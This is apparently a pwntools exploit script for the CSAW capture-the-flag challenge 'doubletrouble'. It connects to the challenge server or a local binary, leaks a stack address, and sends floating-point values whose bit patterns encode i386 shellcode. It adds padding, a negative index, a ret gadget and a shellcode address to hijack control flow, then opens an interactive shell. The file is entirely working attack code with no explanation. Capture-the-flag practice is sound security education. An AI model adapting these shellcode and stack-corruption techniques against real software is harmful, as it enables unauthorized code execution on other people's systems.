#!/usr/bin/env python

from pwn import *
from struct import *
import re, base64


__LIBC__ = ""
__NAME__ = "doubletrouble"
__REMOTE__ = "pwn.chal.csaw.io"
__REMOTE_PORT__ = 9002
__GDB__ = """
c
"""



context.arch = 'i386'

if __name__ == "__main__":


	log.info("pwning %s"  % __NAME__)


	if args.REMOTE:

		log.info("remote run")
		r = remote(__REMOTE__, __REMOTE_PORT__)

	else:

		log.info("local run")

		if args.GDB:

			if args.GDB == 'attach':

				r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})
				log.info("attaching gdb...")
				gdb.attach(r.pid, __GDB__)	

			else:

				r = gdb.debug("./%s" % __NAME__, __GDB__)
		else:

			r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})

	r.recvuntil("0x")
	stack = r.recv(8)

	stack = int(stack, 16)
	log.info("stack 0x%x", stack)

	r.sendlineafter("long: ", str(64))

	pad = "%.20g" % unpack("<d", p64(0xf8ffffffffffffff))[0]
	jmp  = 0x080498A4ffffffff # ret gadget
	jmp2 = 0x0806000000000000 + stack # addr of shellcode


	sh1 = asm("push 0x804A12D; jmp $+3").ljust(8, '\xfe')
	sh2 = asm("call dword ptr [0x804BFF0]").ljust(8, '\xfc')

	r.sendline("%.20g" % struct.unpack("<d", sh1)[0])
	r.sendline("%.20g" % struct.unpack("<d", sh2)[0])

	for i in range(0, 2):
		r.sendline(pad)

	r.sendline(str(-99))
	r.sendline( "%.20g" % struct.unpack("<d", p64(jmp))[0])
	r.sendline( "%.20g" % struct.unpack("<d", p64(jmp2))[0])

	for i in range(0, 64-7):
	 	r.sendline( pad)

	r.sendline("ls")
	r.interactive()



